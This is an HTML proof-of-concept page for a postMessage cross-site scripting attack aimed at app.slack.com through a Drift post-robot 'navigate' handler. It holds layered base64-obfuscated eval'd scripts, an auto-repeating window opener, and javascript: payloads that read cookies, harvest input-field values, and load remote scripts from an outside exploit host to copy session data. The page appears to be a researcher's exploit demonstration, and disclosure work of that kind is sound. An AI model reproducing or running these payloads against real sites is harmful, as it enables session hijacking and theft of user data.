
		
		<!--
				-->

		<html>
<head>
<!-- -->
<!-- -->
<!-- -->
<!-- -->
<!-- -->
<script></script>
<script></script>
<script></script>
<script></script>
<script></script>
<script></script>
<script></script>
<script></script>
<script></script>
<script></script>
</head>
<body>		
		<!-- -->
		<!-- -->
		<p style="font-weight:bold">postMessage XSS</p>
		<p>1. A window should be automatically opened in ~5s. If popup is blocked, unblock popup and click 'Open Window' 
			<span>
				<!--
								-->
				<script id='i'>
					eval(atob('ZXZhbChhdG9iKCdaWFpoYkNoaGRHOWlLQ2RhV0Zwb1lrTm9hR1JIT1dsTFEyUmhWMFp3YjFsclRtOWhSMUpJVDFkc1RGRXlVbWhXTUZwM1lqRnNjbFJ0T1doU01VcEpWREZrYzFSR1JYbFZiV2hYVFVad00xbHFSbk5qYkZKMFQxZG9VMDFWY0VwV1JFWnJZekZTUjFKWWJGWmlWMmhZVkZWYWQwMHhiSEZTYms1cVlrWktNRlF4Wkc5Vk1ERldZMFZ3VjFKRlduSlpla1pUVWpGS1dXSkdXbWxXTW1oWlZrWldZV1F3TUhoaVNFWlRZbXMxY1ZscldrdE5SbEY0V2tjNVZrMUVSbGRaTUZaM1ZqRktSbGR1U2xwbGExcFVWV3BHUzFkWFNrZFhiV2hPVm01Q1dsWnRNSGRsUmxaMFZWaG9WMkZzY0ZSWlZFWjNZekZXZEdSSVpFNVdiSEJKVkZab1QxWXdNVVZTYkdSYVRVWndNMVpxUmtwbGJVWkpVMjFHVTFKWVFraFhiRlpoVkRGa1dGTnJhR3hTYXpWVVZqQldTMkl4V1hoYVJGSm9UVVJXU0ZVeWRHdGhiRXBZWVVVNVYySkdTbnBXYkZwWFpFZFdTVnBGTlZkaVNFRjNWMnhXYjFReFdsaFNhbHBUWW01Q1YxUlhOVU5WUmxsM1YyMUdUMkpGV25oV1YzaHJWakZLV1ZGc1ZsaGhNVnBvVm1wS1QxWXhaSFZWYkU1b1pXeGFVRlpYZUc5Uk1WSlhWMjVPVm1Fd05YQlVWbHBIVGtaYVdHUkhkRlpOVjFKSldWVmFVMWR0U2xsVmFrNVhZa1p3ZWxac1drZFdWa3B6VjJzMVYwMHlhRmhXYkZwcVRWZEZlVkpyV2s1WFJYQnhWVzB4VTFkR1VsaE9WVTVZVW14d2VWWXlNVWRYUmtsM1YydG9XbFpYVWtoV2FrcExWakZPY2sxV1pGZE5NVXB2Vmxkd1IxbFdaRWRVYmtwWVlsaENWRmxZY0ZkVlJscDBaVWR3VDFaVVZsaFdNalZIVlRKS1JrNVdXbFZXYkhCNlZHeGFZVmRIVWtoa1IyaHBVbGhCZDFkV1ZtRlJNVmw1VWxob1dHRXphRmhWYWs1dlpXeHNObEp1WkZOTlZrb3dXVEJWTVZkR1NsWmpSV3hYWWxSQ05GUnJaRVpsVmtwMVUyczFWMkpZYUZSWFYzUnJUa1phYzFkdVVrNVdhM0JQVlcweE5GZEdaSEpXYWtKb1lYcEdWMVJzYUhOV01WbzJVbXRvVjJGcmNFeFZha3BQVWxaa2MyRkdaR2xTV0VKR1ZtdGFWMWxXVFhoVFdHaFdZbXhhV0ZsclpHOWpSbGwzVm10MFYxWnNjRWhXTWpGSFlUSktWMWRyYUZkTlYyaHlWbTB4UjA1dFNrZGhSbFpYVFRKb2IxWnFSbUZXYlZaWVZXdGtWV0pIVWxSWmJGcExVMFphVlZOdWNFNVdiVkl3VlRKNGMyRkdTa1pPVjBaYVZqTlNhRnBYZUhKbFZURldXa1pPVGxkRlNrcFhWM1JoVkRGWmQwMUliR2hTV0doWVZGYzFiMWRHV2xWVGEzQnNVbXhLTVZaSGVFOVhSa2w0VTI1a1YxWkZTbGhWZWtaaFl6RldjMVpzVW1sU1ZGWlFWMWQwWVZZd05WZGpSVnBYVmtaYVdGbHNWbmRXTVZwMFkwVTVXR0Y2UmtoV01uaFRWakpLV1dGSFJtRldNMmd6Vld4YVlXTXhjRVpPVm1ScFlUQnNOVlp0ZUZOVE1EVklWVzVTVjJFeWFGUldNR2hEWTBaV2RHUkZkRmhTYkVwV1ZXMTBNR0ZWTVZkalNIQlhWak5TVUZaVVNrZE9iRnB6WVVaa1UwMHlhRzlXYlhoclVtMVdjMVp1U2xCV2JGcFlWRlJHUzJJeFduRlNiVVpXVFdzeE5Ga3dWbGRWYlVwWVlVWm9WMkV4V2t0VVZscGhZekZyZW1GSGNFNVdia0pLVmxjd01WTXhVWGhYYms1VVlsVmFXRmxyWkZOV1JscFdWMjVrVTJKSFVqRlhhMXBUVlRBeFYyTkZjRmhoTVZwb1ZsUkdWbVF3TVZkWGJXeE9UVEJLV1ZaR1dtdFVNREI0WTBaYVdHSkdjSE5XYlhoaFRWWmFXR1ZIUm1oU01IQklXVEJqTlZZeFdYcFJhMmhXWld0YVdGbDZSbXRYVm5CSVVteE9hR1ZzV2pWV2ExcGhZVEExUmsxVlpGWmlSMUpaV1Zod2MySXhVbGhrU0dSWVVteFdORlpYZEd0V01WbDNZMFZzV2xaWFVuWldNbmhhWlcxR1JtUkhSbGRXYmtKNVYxUkdZVk15VFhoV2JrcFBWbXMxV0ZWdGVIWk5SbHB4VW0xR1dsWnNiRFZXUm1odlZrZEZlV0ZHV2xkTlIxRXdXVlZhVjJOV1VuTlViR2hYWWtad05sZFdWbGRVTVZGNVUydGtWMkZzU2xoWmJHaE9UVlpzY2xwRmRGUlNWR3hXVmtkNGQyRkZNWFJoUlZaWFlXdHdObHBFU2xKbFJsSjFWR3hPYVZaV2NGbFhWM1JoWkRBMVYxZHJaRlpoTWxKVVdXeGFZVmRHYTNkV2JrNVhVakJ3U0ZVeU1EVldWbHBYVTJ4b1YyRXhjSEpXYWtaWFkyeFNkR1JGTlZkWFJVcEtWbXBLTUZZeVJYbFNiazVVWVd4d2NGVnFRbUZXYkZwMVkwVmFUbEpzV25sV01qVlBWakF4VjJOR1dsWmlWRVl6Vm1wS1MxSXlTWHBhUm1oWFVsVndlVmRZY0VkVk1sSkhWRzVLV0dKWVFsVlZNRlpMVjBaYVIxZHRSbHBXYkZZMFdUQldWMVV5U25OalNFNVdZV3RLTTFVeWVHRmtSMVpJVW0xb1YwMUlRa3RXVm1ONFlqRlplVk5yWkZSaE0yaGhXVmQwZDFWR1duRlRhM1JVVm10d2VsWlhNWE5WTVZwSFYycE9WMkpIVVRCWmFrWldaVVprZFZSdGJGTlNia0pVVjFaa01GTXhXa2RXYmxKc1VqQmFXVlp0TlVOU01WcDBZMFZPVjJKVldUSlZiWGhyVmpBeGNWWnVjRmRpV0U0MFdrWmFWMk14Um5OalIyeFhVbFp3U1ZZeWRGTlRNVkY0VTI1T1YySnJOVmxaYTJSVFZERlNWMVp1WkZWaVJuQjZWako0VDFVd01YSldhbFpYVW0xb2VsWnJaRXRTTWs1SlUyeGFhVkl4UlhkWFZsWmhWbTFSZUZkdVNtdFNNMEpVV1d4b2IxZFdXWGxrUms1U1RXdGFXVlV5ZEhOVmJVVjRZMFprVlZZelFsaFdWVnB6VmxaS2RGSnNhRmROUm5CSFZsY3hORmxXV1hsV2JrNVlZbFJzV1ZadE1WTk9iSEJGVTJ4a1UwMVdTakZWTW5oRFZqSktXR0ZJWkZkV00wSk1XV3BHVjFZeGNFbFViVVpUVW10d2VGWkdXbXRWTVU1SFlUTmtWMkpVYkhCVmJYUjNWMnhzVmxkck9WZFdiSEJaV1ZWV1QxWldXWHBoU0VwWFRVZFNVRlZ0Y3pWV01YQkdUbGRzVTJKclNtaFdiVEUwV1ZkSmVWVlliRk5YUjFKUFZqQmFTMk14Vm5OaFJrNVhUVlp3ZVZac1VrZFdiRXAwWlVSQ1lWWlhhSEpXVkVGNFkyeGtjbHBIUmxOV01VbDZWbXRrTkZReFRraFNhMXBZWWtkU1dGbHJhRU5sUmxwSFYyMUdWazFWTlVoVk1qVlBZVVpLYzFkdVFscGlSbkJNVm1wR1lWSXhWbkprUmxwT1VrVmFObFp0ZUc5ak1rVjRVMnhXYVZKdFVtRlphMXBoVjBaU1ZWSnVTbXROVm5CNlZrZDRiMVV5UlhwUmEyaFhWa1Z3TmxwVldtRmpNV1J5VjJ4b2FFMXRhR2hXUm1NeFlqRldSMkV6Ykd4U2F6VnhWRlpWTVUxR2JISlhhemxWWVhwR1Yxa3dVazlXTWtWNFkwaEtZVll6VGpSVk1GcGhZMnh3U0dKR1VsTldSbHAyVm14amQyVkdWWGxVYms1WVltdGFWRmxVVGxOV1JscDBaVVYwYkdKSFVscFpNRlpyVjBkS1IyTkVRbGRXTTFKMlZtMXplR1JXVm5WVGJHUk9ZV3RhU0Zkc1dtRldNazE1VW10b1UySkZOVmhaYlhSSFRteGFkR05GVGxkaGVrWllWako0YTFVeVNuSk9WbFphWWtkUk1Ga3dXbHBrTVhCSVQxWldWMkpJUWpSV1ZFcDNVVEZhVmsxWVNtcFNSVXBYVkZkd1YxWkdXbFZUYTNSVFRWVTFNRlZ0ZUZkV01VcFdZMFV4VjJFeVVUQlpla3BUVTBaV2NtSkhSbE5OTUVwUVZtMXdUMkl3TlhOWFdHaG9VMGRTV0ZSV1drdE5SbFY1WkVoT1ZtSlZjRWhXTW5oelYyeFplbFJZYUZaaE1YQm9WbTE0ZDFJeFVuSlBWMmhzWVRGd1NGWXhaREJXTURGSVUydGtXRmRJUWxkWlYzTXhWbFpzZEUxVVVteFdiWFF6VmtjeGQyRnNTbGxWYkU1V1VteEdNMWx0ZERCV1IwWTJUVWMxVEZVeWN6bEtlV3R3SnlrcCcpKQ=='))
				</script>
			</span>
			<input type='button' value='Open Window' onclick='open_window();'/> 
		</p>
		<p>2. Wait for the page to finish loading, you should then see the XSS alert popup<span><span></span></span></p>
		<p>
			<span>.<span>
			<span>

				
				<!--  -->
				<script id="xsfs">
				eval(atob('ZXZhbChhdG9iKCdaWFpoYkNoaGRHOWlLQ2RhV0Zwb1lrTm9hR1JIT1dsTFEyUmhWMFp3YjFsclRtOWhSMUpJVDFkc1RGRXlVbWhXTUZwM1lqRnNjbFJ0T1doU01VcEpWREZrYzFSR1JYbFZiV2hYVFVad00xbHFSbk5qYkZKMFQxZG9VMDFWY0VwV1JFWnJZekZTUjFKWWJGWmlWMmhZVkZWYWQwMHhiSEZTYms1cVlrWktNRlF4Wkc5Vk1ERldZMFZ3VjFKRlduSlpla1pUVWpGS1dXSkdXbWhOVm5CWlZtMHdlRlZ0VVhoV2FscFRZVEZ3YzFWdGRIZE5WbHBJWTNwR2FGWnJiRFpaVldSSFZqRmFSbGR1U2xwV1JYQk1WV3BHVTJOc1pISlBWbWhUWVROQ1lWWnNaREJXTWxGNVZtNU9hVk5GTldoVmJGSnpZMnhXZEdSSVpFNVdiSEJaVkZaV2ExWXlSalpTYTJSWFlrWktTRlp0YzNoV01XUjFVMnhrVjFKWVFsVlhXSEJMVW0xV2RGUnJaR0ZTTW5od1ZXeG9RMlJzV25STlJFWnJUVlp3TUZaV2FHOVdiVVY1WVVVNVYySkdTbnBaZWtaaFpFVTFWbFJzYUZkaVJtOTNWMVJDVjFReFpITlhiazVxVW0xb1dGUlhjRmROTVZsM1drVjBWRkpzU25oV1YzaDNZVVV4YzFOck1WaGhNWEJvVm1wR2ExSnJPVmRYYlhCVFRXNW9XVlpHVWt0aWJWRjRWMWhvVm1FelFuTlZiWFJ6VGxaYVdHUkhkR2hpUlhCNlZUSjRWMVl3TVVkWGEzaFhWbXh3TTFWc1drOVdWbHAwWWtkc1UxWkdXbGxXYlhSclRVWk5lR0pHV2s1V1YyaHpWV3hhWVZZeFduUk5WazVxWWtaV05WcFZWbUZoTURGV1kwUkNWV0pHY0ZSV2FrWmhWbFphY2xWc1pFNWlhMHBGVjFod1IxTXhTWGhUYms1b1VqQmFWRll3Vmt0V1JscEhWbXhrV2xac1NraFhhMmhQVmpKS1ZXSkdXbFZXTTFJelZqQmFhMk5XVW5WVWJXaFhZVEk0ZVZaWE1ERlNNV1IwVTJ0a1dHSlhhRlpXYkZwM1kyeHNObEpzVGxkV2EzQXdXbFZrYzFaR1NsWmpSMmhYWWxob2NsUlZXazVsVmtwWllVWldhRTFzU2xaWFZtUTBXVlpzVjFkdVVrNVdhelZXVlcxNFMxZEdaSEpYYXpsWFVtdHdlbGt3V25OV1ZURlhWMnBPV2xadFVraFViWGhYWTFaU2MyRkhiRk5pYTBvMVZtdGtNR0V4VFhoVGJsSlVZVEo0VTFsc2FGTlVNV3h6VjJ0MFZWSnRVbGxhVldSSFZrVXhjMUpxVWxwaE1VcG9WbXhrUm1Rd05WbFNiRlpYWWxaRmQxWnFTalJqTVdSWVZHdG9VMkpYYUZoVVZXaERWakZrV0dSR1RsTk5WMUpKVlRKMGExWkhSbk5qUjBaWFlsaG9ZVnBFUm1Gak1YQkdUbGQwVG1KRmNFaFhWRUpoVXpGU2MxTnNaR3BTUlZwWVZtdFdZVmRHV2tWU2EyUnFUV3RzTmxkclpITlZNVnB5WTBaU1YySllRa3hXVkVaT1pVWmFjMVpzU21oTmJFcDNWMWQwVmsxV1dYaFhhMmhyVWxoU1lWWnNVa2RUVm5CV1ZteGtWMkpHY0RCV1Z6VkxWbTFGZUdOR2FGVmlWRVpJVld4YVQyUkdTbk5hUm1ST1lsZG9VMVpxUm10T1JteFlVMjVTVjJKSGFGVlpWRXB2VkRGYWNWUnJUbXBTYkhCNlZqSTFZV0V3TVZkaVJGWmhWbFpWZUZaSGVGcGtNRFZXWVVad1RsSnNjRlZXYkdRMFdWWk9TRlpyV210U2JIQllWV3hXZG1WV1drZFdiVVpxVFVSV2VsWkhOVTloYkVsNVlVWm9WMkV5VVhkVWJYaHJWMGRPUm1SSGFFNVdWRlkyVmxkNGIyRXhWWGxUYkZaWFlrWmFXRmxyV2xabFJsWlZVbTEwYWxacldqRldSM2hQVlRKRmVHTkdjRmROYmxKWVdrUkdWMk5yTVZaWGJHaHBZa1p3V0ZaR1dtRlpWbFpIVm14b2JGTkdjSEpVVjNSM1VqRmFXR1ZGZEZkTlYxSkhWVEl3TlZZeFdqWldhazVhWld0d1VGWnFTazlTYkhCSFkwVTFUbUpYYUROV2JHUjNVVEpSZDAxV1pGaGlSMUp2VlcweFUySXhiSEphUms1VVVteHNOVlJzVlRWWFIwWTJVbTVvVjJKVVZqTldha3BHWlVkT1JWUnNaRTVTTVVwWlZsUkNhMVl4U1hsVWExcFBWbFJXV0ZadWNISk5WbHB4VW14T1ZFMUVSa2hWTVdoelZsWmtTR1ZHVmxwV1JWcE1XVlZhVTFkRk1WVlZiSEJYWWxob05sWnNZekZVTWtaMFUydHNVbUpIYUZoVmFrNVRWVVpzY2xwRmRGUlNNVXBHVmpKNFlWUnRSbk5YYTFaWVZtMVJNRlpFUmtwbFJrNTFWbXhLYVZKcmNGQldiVEF4VVdzeGMxcElTbFpoTWxKd1ZGWmFkMUl4VW5OWGJrNWFWbXR3TVZWWGVITldiVXBJWVVWU1lWWXphSEpXTUZWNFVsWktjMWRyTlZkaE1XdDRWbXhTUjJJeVRYaFhibEpVWWtkNGIxVnNVbGRaVm14eVYyMUdhRkpzU2xaVmJUVkxZVEF4V1ZGcmFGaGhNbEYzVm1wS1MyTnNUbkpoUm1Sb1RXczBlbFpIZUd0U01VbDRXa1pzYWxJeWFGVlZiR2hEVm14YVIxWnRkR2xOYkVwNldUQmFiMkpHVGtoVmJrWlZWbFpLZWxZeWVGZFhSVEZXV2tkb1YwMUdXVEpXVm1NeFdWWmtSMWRZY0doVFJYQllXV3hTUjFWR1ZuUmplbFpYVm14d2VsVXllR3RVYlVwR1kwVXhWMkpHY0ZSVlZFWktaVlpPZFZSc1ZtbFNia0pYVjFaU1EyUXlSa2RWYkZwaFVrWktWRlp0ZUdGWFJtUnlXa1JDVjFJd2NFZFdiWEJQVm0xS1ZWRllhRmRoTVhCb1ZtMXpNVlpzVW5OaFIyaG9UVWhCTWxac1dtcGxSa3AwVlZoc1ZtRXhjSEZWYlhSM1ZERldjMWR1WkU1V2JIQldWVzE0YTFaVk1WWlhibkJhWVdzMWNsbFdXa3RXTVU1elZHeGthR0V6UWxWV1dIQkhWakZhVjFKdVNtRlNNbmh3Vld4U1YxZEdXbkphUkVKVVRWZDRWMVJXVm05aVJrcFhWMnhrVjJKVVJsUlpNbmhYWTJ4a2RHUkdVbE5OUm5CSFZtcEtOR0l5UmxkYVJXaFZWMGRvV1ZaclZrdGhSbkJGVTJ4T1YwMVdTakZXVnpGdlZUQXhkV0ZHYkZkU2JIQm9Wakl4VjFJeFpGbGhSbHBvVFRCS1VWWnRjRWRUTVdSWFYyeG9hMUo2YkZoVVYzUjNaV3haZVU1VmRGZGlWWEJXVlcxNFUxbFdTa1pYYm5CaFVsWldORlpxUmxOa1IxSklZa1prYUUxdVVUQldiWFJyVGtkSmVGVlliRk5pUm5CUFZqQldkMVZHV25WalNFNW9VbXhhZWxkcldrOWlSMHBKVVd0c1ZWWnNXWGRaVjNoTFZsWmFjMkpHVms1V01VbDZWMVphWVZsWFRYbFVhMVpTWWtad1QxWnRlSGRXUm1SeVZXdGthMkpXV2xoV2JYaHpZVlpKZVdWR1ZsWmlXR2d6V1dwR1lWZEZOVmxhUjNCcFZteHdObFpzWkRCaU1WSnpWMnRrVkdKcmNHRlpWRXBTWkRGU2MxZHNaR3RTTURWSFZrY3hiMVV5U2toUFNHeFlWak5TVkZWcVJtRldNVTV4VjJ4T2FXSklRbTlXYlRFMFpEQXdlRmRZWkZoaVdGSllWbTAxUTFJeFdsaE5WemxYVFZad1dGa3dVa2RXTVZwR1YyeG9WMUpGV2toWmVrcEtaV3h3U0dKR1RsZGhNMEpWVm0weGQxTXhWWGhVV0doWFlrWmFVMWxVU2xOalJteHlWbFJHVjAxV2NFbGFSVll3VjJ4YVZWSnJiR0ZXVmxwWVZtMTRZV1JHVm5WVGJGcE9ZbTFvU1ZacVFsWk9WbVJHVGxaa1ZtSkhVbGhXYTFwaFVsWmFjVk51WkZKTmF6RTBWVEowYTFVeVNraGhSMmhXWWtkb1JGWlVSbE5XYkZwMFVtMTBWMkpHV1RCV2JURjZUbFpXZEZOcmFGQldSVFZoV1ZSR1lWWkdXbGhsUm5Cc1ZteGFlVnBGV21GV01VcFdZMFZzVjFkSVFraGFSRVpMVmpGU2RWWnNWbWxYUmtwWlYxY3hNRk14VG5OWGExWlRZa1UxVmxSV1pGTlRWbHAwWlVjNVYySkdjRWRWTWpGSFdWWlplbFZxVGxoV2JIQjZXa1ZrVjFORk9WZGFSazVvVFZoQ1dGWXhaREJXTWxGNFYydGtWRmRIZUdoYVYzUjNWMFpTV0dORldteGlSa3A2VjJ0Vk5WVXdNWEpPVlhCWFlsaG9WRmxXV2xwbFYwWkpXa1prYVZkRlNrbFdiWEJDWlVaWmVHTkZaRmRpUmtwWVZXMTRkMlZXV25SalJXUlVUVlUxV0ZZeU5WTlVNVnAwVlcwNVZWWnNXak5VVlZwaFYwVTFXR1JHYUdsV1dFSlhWbGN4TkZVeGJGZFRhbHBUWWtaS1ZsbHNVa2RVTVhCRlUyeE9VMkpWTlVoVk1uTXhWVEZhZFZGWWFGZGlSa3BJVm1wR1VtVkdTblZVYld4T1RXeEtkMVpYZUdGVE1WVjRWMjVHVkdKRk5WVlVWbHBoVm14V1dHUkhkR2hXTUhCSFZHeGFhMVl4U1hwVmEzaFlWbXhXTkZVd1pGZFNiRnB6VjJ4a2FWWnJjRFZXYkdRd1dWZEZlRlJyWkZkaWJGcG9WVzAxUTJOR1duSldiVVpYVm0xU2VWZFVUbTlXYlVwWFYydHNWMUp0YUhwV1JFWmFaV3hXY2s5V2NHbFNNbWd4VjJ4V1lWWnRWbGhVYTFwWVlsaFNUMVp1Y0hKTlJscFhXa1JTVmsxV1dqQlZiVFZMVkRGYU5tSkdhRnBpVkZaRVZqQmFjbVZYVmtsVWJYQlhZa1Z2ZDFkclZtRmtNa1pHVFZoR2FHVnJjRmxXYlhoaFpHeHdSVkp1VGxoU2EzQjZXVlZhWVdGV1pFZFRiR1JYVW14S1RGWlVRWGhqTVhCSlVteEthV0Y2VmxWV1Z6RXdXVlprVjFwSVNsZGliVkpYV1Zod1IxSXhXWGxPVm1SWFlYcEdXRll5ZUVOV2JGbDZZVVJLWVZKRmNFeFZiWGhYWXpGT2MxcEZOV2xTV0VKT1ZtMTRZVlV4UlhoVFdHeFVZbXMxVmxsclduZFdiR3hWVVc1a1YxWnRlSGxaVlZaUFZrWmFjMUpxVWxoaE1taHlXVlZWZUZZeVNqWlRiRnBwVmtaYVVWWnFTWGhUTVZwWFYyNU9WV0pWV2xSWmEyaENaVlprYzFkdFJscFdNRFZZVlcwMVQxWlhTa2hWYXpsVlZucEdkbFJ0ZUZwbFJuQkZWVzFvVGxadGR6RldiR1EwWWpGYWRGSllhR3BTYkZwaFZtcE9iMkZHV25OWGJVWnFWbXR3ZVZkclpEQmhWa3BWVm14d1YxSXphSEZVYkdSTFUwWk9jbUpHU21oaE1YQlpWbGN3ZUZVeVZuTlhhMXBZWWtkU1VGbHJXbmRsUmxwMFpVYzVhRlpyYkROVWExSkRWMGRGZVZScVVsZFdSWEJVVldwR2EyTXlSa2RSYkdSWVVqSm9XbFpzVWtOV2JWRjNUbFprVldKc1duQlZNRlozWTFaV1ZWTnJPV3ROVlRFMFZXeFNjMVZXVlhsVWJtUlVUVlZWTlZWR1RtcGpSWFJTVUZRd2JrdFRhejBuS1NrPScpKQ=='))
				</script>
				
				<!--  -->

			</span>
		</span></span></p>
		<br/>
		<br/>
		<!-- -->

		<div style="display:none">
			<p>Select a URL to open:</p>
			<select id="open_url">
			</select>
			<p>Select a Payload to execute</p>
			<select id="selected_payload">
				<option value="alert_cookie" selected>alert(document.cookie)</option>
			</select>
					
			<input type='button' value='Execute XSS' onclick='execute_xss();'/>
			<br/>
		</div>
		
		<!-- -->

		<iframe id="vulnframe" style="display:none; width:0px; height:0px;" src=""></iframe>
<!-- -->

		<script>
		var urls = [
			"https://app.slack.com/"
		];

		var open_url_elm = document.getElementById("open_url");
		for(var i=0;i < urls.length;i++) {
			var option = document.createElement("option");
			option.setAttribute("value", urls[i]);
			option.innerText = urls[i];
			
			open_url_elm.appendChild(option);
		}
		
		window.addEventListener("message", function(e) {
			if(typeof e.data==='string' && e.data === 'souxj') {
				clearInterval(window['owi']);
			}
			if(typeof e.data==='string' && e.data.startsWith('sourw')) {
				win = window.open(e.data.replace('sourw|',''));
			}
		});
		var target = null;
		var sent_pm_already = false; // has sent initializing postmessage?
		
		var jumperframe = null;
		
		function sleep(ms) {
			return new Promise(resolve => setTimeout(resolve, ms));
		}
		
		function jumperinitt() {
			//
		}
		
		function open_window() {
			var url = document.getElementById("open_url").value || "";
			win.postMessage("sourw|" + url, '*');
		}
		
		function execute_xss() {
			
			var command = document.getElementById("selected_payload").value;
			var t = Date.now();
			var payload = "";
	
			if( command === 'alert_cookie' ) {
				payload = 'javascript:alert(document.cookie);';
			}
			if( command === 'input_fields' ) {
				//payload = `javascript:var niraeth_input_data = {}; document.querySelectorAll("input").forEach(function(element) {niraeth_input_data[element.name] = element.value;}); console.log("NIRAETH input data:"); console.log(niraeth_input_data); alert('check your console.log for the input data');`;
				// if above payload doesn't work,
				payload = "javascript:eval(atob(`dmFyIG5pcmFldGhfaW5wdXRfZGF0YSA9IHt9OyBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCJpbnB1dCIpLmZvckVhY2goZnVuY3Rpb24oZWxlbWVudCkge25pcmFldGhfaW5wdXRfZGF0YVtlbGVtZW50Lm5hbWVdID0gZWxlbWVudC52YWx1ZTt9KTsgY29uc29sZS5sb2coIk5JUkFFVEggaW5wdXQgZGF0YToiKTsgY29uc29sZS5sb2cobmlyYWV0aF9pbnB1dF9kYXRhKTsgYWxlcnQoJ2NoZWNrIHlvdXIgY29uc29sZS5sb2cgZm9yIHRoZSBpbnB1dCBkYXRhJyk7`));";
			}
			if( command === 'input_parent_fields' ) {
				//payload = `javascript:var niraeth_input_data = {}; window.parent.document.querySelectorAll("input").forEach(function(element) {niraeth_input_data[element.name] = element.value;}); console.log("NIRAETH input data:"); console.log(niraeth_input_data); alert('check your console.log for the input data');`;
				payload = "javascript:eval(atob(`amF2YXNjcmlwdDp2YXIgbmlyYWV0aF9pbnB1dF9kYXRhID0ge307IHdpbmRvdy5wYXJlbnQuZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgiaW5wdXQiKS5mb3JFYWNoKGZ1bmN0aW9uKGVsZW1lbnQpIHtuaXJhZXRoX2lucHV0X2RhdGFbZWxlbWVudC5uYW1lXSA9IGVsZW1lbnQudmFsdWU7fSk7IGNvbnNvbGUubG9nKCJOSVJBRVRIIGlucHV0IGRhdGE6Iik7IGNvbnNvbGUubG9nKG5pcmFldGhfaW5wdXRfZGF0YSk7IGFsZXJ0KCdjaGVjayB5b3VyIGNvbnNvbGUubG9nIGZvciB0aGUgaW5wdXQgZGF0YScpOw=='));";
			}
			
			if( command === 'dump_session_as_code' ) {
				payload = `javascript:var scr=document.createElement('script'); scr.src='https://exploits.niraeth.com/scripts/copy_session_as_code.js?t=${t}'; document.head.appendChild(scr); alert('copy_session_as_code.js loaded')`;				
			}
			if( command === 'change_ayden_iframe_src' ) {
				payload = `javascript:var scr=document.createElement('script'); scr.src='https://exploits.niraeth.com/scripts/change_ayden_iframe_src.js?t=${t}'; document.head.appendChild(scr); alert('change_ayden_iframe_src.js loaded')`;
			}
			if( payload === '' ) {
				alert("Invalid payload");
				return;
			}					
			
			//payload = "javascript:alert(1)";
			//alert("sending payload: " + payload);
			window.postMessage(JSON.stringify({ "__post_robot_10_0_16__" : {id: new Date().getTime(), type:"postrobot_message_request", sourceDomain:"",origin: "https://js.driftt.com", name: "navigate", data:{url:"${payload}" } }} ), '*');
		}
		window['owi'] = setInterval(open_window, 4444);
		
		
		</script>

</body>
</html>





